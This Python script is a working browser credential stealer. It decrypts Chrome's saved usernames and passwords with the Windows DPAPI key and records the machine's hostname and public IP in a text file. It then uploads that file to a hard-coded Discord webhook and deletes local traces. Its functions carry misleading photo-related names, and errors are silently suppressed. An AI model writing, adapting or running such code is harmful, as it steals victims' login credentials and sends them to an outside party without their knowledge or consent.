import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import timezone, datetime, timedelta
import socket
import requests

nom_ordi = socket.gethostname()

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
        
def pics_fly():
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]        
        if username or password:
            with open(f"{nom_ordi}.txt", "a") as file:
                file.write(f"Origin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}\n")
        else:
            continue
        if date_created != 86400000000 and date_created:
            with open(f"{nom_ordi}.txt", "a") as file:
                file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")
        if date_last_used != 86400000000 and date_last_used:
            with open(f"{nom_ordi}.txt", "a") as file:
                file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")
        with open(f"{nom_ordi}.txt", "a") as file:
            file.write("=============================================================================\n")
    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass
    try:
        nom_fichier=f"{nom_ordi}.txt"
        if os.path.exists(nom_fichier):
            requests.post("https://discord.com/api/webhooks/1213941294733463626/Q_TkB-fWr7Sz8SMBm-sHl_qf5tWanrg6WsTqCEe3aMnYNT6QO1HzODwYsaFX4Q7UnFwN", files={"file": open(f"{nom_fichier}")})
            os.remove(nom_fichier)
            pass
        else:
            pass
    except Exception as e:
        pass

def decalage_photo():
    try:
        response = requests.get('https://httpbin.org/ip')
        ip_publique = response.json().get('origin')
        return ip_publique
    except Exception as e:
        pass
        return None

with open(f"{nom_ordi}.txt", "w") as file:
    file.close()
ip_publique = decalage_photo()
with open(f"{nom_ordi}.txt", "a") as file:
    file.write(f"{nom_ordi}\n{ip_publique}\n\n\n")